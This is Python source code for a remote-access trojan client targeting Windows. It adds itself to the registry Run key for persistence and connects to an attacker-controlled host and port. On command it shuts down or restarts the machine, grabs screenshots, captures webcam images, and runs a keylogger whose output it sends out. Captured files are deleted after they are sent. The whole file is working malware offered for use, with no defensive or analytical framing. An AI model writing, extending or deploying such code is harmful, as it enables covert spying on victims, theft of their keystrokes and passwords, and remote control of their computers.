from ctypes import sizeof
import sys
import socket
import os
import pyscreenshot
import os.path
import cv2
import winreg as reg
from winreg import *
import os
import keyboard
from dotenv import load_dotenv

load_dotenv()
s = socket.socket()
host = os.getenv('IP_ADDRESS')
port = int(os.getenv('PORT'))

class Keylogger:
    def __init__(self):
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")

        self.log += name

    def get_data(self):
        return self.log

    def start_keyLog(self):
        keyboard.on_release(callback=self.callback)
    



def AddToRegistry():
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    try:
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        return True
    except WindowsError:
        pass

    try:
        pth = os.path.dirname(os.path.realpath(__file__))
        s_name = "client.exe"
        address = os.path.join(pth, s_name)
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)
        reg.CloseKey(open)
        CloseKey(aKey)
        CloseKey(aReg)
        return True
    except EnvironmentError:                                          
        return False

    

def create_send_remove_file(file_location):
    f = open(file_location,'rb')
    size = os.path.getsize(file_location)
    readData = f.read()
    s.send(str(size).encode())
    s.send(readData)
    f.close()
    os.remove(file_location)

def functions(a):

    if a == '1':
        print("shutting down")
        s.send("command received shutdown".encode())
        os.system("shutdown /s /t 1")
        sys.exit()

    elif a == '2':
        print("restarting")
        s.send("command received restart".encode())
        os.system("shutdown /r /t 1")
        sys.exit()

    elif a == '3':
        a = pyscreenshot.grab()
        file_location = 'temp.jpg'
        a.save(file_location)
        create_send_remove_file(file_location)
        
    elif a == '4':
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            s.send('Error'.encode())
        else:
            _ , image = cap.read()
            file_location = 'temp.jpg'
            cv2.imwrite(file_location, image)
            create_send_remove_file(file_location)

    elif a == '5':
        c = Keylogger()
        c.start_keyLog()
        while True:
            data = s.recv(1024).decode()
            if data == '8':
                logged = c.get_data().encode()
                s.send(str(sys.getsizeof(logged)).encode())
                s.send(logged)
                keyboard.unhook_all()
                break

    elif a == '6':
        s.send("closing connection".encode())
        s.close()
        sys.exit()


def recv_command():
    while True:
        try:
            a = s.recv(1024).decode()
            functions(a)
        except Exception:
            sys.exit()

if __name__ == "__main__":
    reg_add = AddToRegistry()
    connected = False
    while not connected:
        try:
            s.connect((host, port))
            connected = True
            print("connected")
            if reg_add:
                s.send('Added to WR'.encode())
            else:
                s.send('Not added to WR'.encode())
        except Exception:
            pass  
    recv_command()
